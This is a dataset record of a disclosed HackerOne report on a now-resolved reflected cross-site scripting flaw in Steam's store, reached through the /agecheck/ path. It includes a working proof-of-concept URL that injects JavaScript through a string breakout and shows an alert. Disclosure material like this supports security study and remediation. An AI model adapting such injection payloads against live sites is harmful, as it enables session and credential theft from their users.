---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '406704'
original_report_id: '406704'
title: XSS @ store.steampowered.com via agecheck path name
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: valve
created_at: '2018-09-07T09:15:52.056Z'
disclosed_at: '2019-01-07T20:11:49.328Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
asset_identifier: store.steampowered.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS @ store.steampowered.com via agecheck path name

## Metadata

- HackerOne Report ID: 406704
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: valve
- Disclosed At: 2019-01-07T20:11:49.328Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I found a Cross-Site Scripting (XSS) in store.steampowered.com because the path after /agecheck/ is not sanitized as it should.

```
https://store.steampowered.com/agecheck/appmhuh2',{ sessionid: g_sessionID, ageDay: '', ageMonth: '', ageYear: '' } ).done( function( response ) { }%20 );}alert`XSS-by-TvM`;function x(){$J.post('mr2n2/247660/
```

Open this^ link, and XSS will be executed! Tested on FF 61.0.2

Looking forward!

Best regards,
Pedro

## Impact

A cross-site scripting vulnerability allows an attacker to modify the page. The attacker can inject forms to steal usernames, passwords, cookies,etc. In short, XSS opens the doors to plenty of phishing techniques.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
